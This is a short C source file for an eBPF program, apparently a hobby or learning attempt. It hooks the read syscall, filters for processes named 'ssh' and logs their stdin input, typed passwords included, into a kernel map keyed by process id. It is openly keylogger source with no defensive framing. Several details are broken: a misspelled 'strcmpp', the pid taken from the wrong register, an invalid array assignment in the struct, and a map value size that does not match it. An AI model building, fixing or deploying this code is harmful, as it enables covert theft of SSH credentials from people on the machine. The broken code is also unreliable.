#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/unistd.h>

// macros for defining a map t store keylogs 
struct bpf_map_def SEC("maps") keylog_map = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(int),
    .value_size = sizeof(char[1024]),// this is a limitation only accapts only till 1024 
    .max_entries = 1024,
};

//strcuture for logging in key time andd the pid 
struct keylog_entry{
   
       char key[1024];
       char time[32];
       int pid;
    
};
  //hooking into the read syscall
   SEC("kprobe/read")
   
   int bpf_read(struct pt_regs *ctx) {
  int fd = (int)PT_REGS_PARM1(ctx);//file descriptor for stdin that is 0
    void *buf = (void *)PT_REGS_PARM2(ctx);// buffer where the data is read 
    size_t count = (size_t)PT_REGS_PARM3(ctx);// number of bytes read 
   
  //getting the pid of current process 
  int pid = (int)PT_REGS_PARM5(ctx); // PT_REGS_PARM5 for PID
   
   //getting the process name using a helper funvtion (get_task_comm)
   char comm[16];
   //if the pid matches the process name ssh thne only the function will be true
   bpf_get_current_comm(&comm , sizeof(comm));
   if (strcmpp(comm, "ssh") !=0) return 0;
   
   // eroor handling for fd=0 that is for standard i/p
    
      if (fd == 0) {
        char keylog[1024] = {0};
        size_t len = count;
        if (len > sizeof(keylog) - 1)
            len = sizeof(keylog) - 1;
        bpf_probe_read_user_str(keylog, len, buf);
        
        //creating entry 
        struct keylog_entry entry ={
          .pid = pid,
          .time = "time",
          .key = keylog,
        
        
        };
   
   //storing in the map 
    bpf_map_update_elem(&keylog_map, &pid, &entry, BPF_ANY);
   }
   return 0;
   }
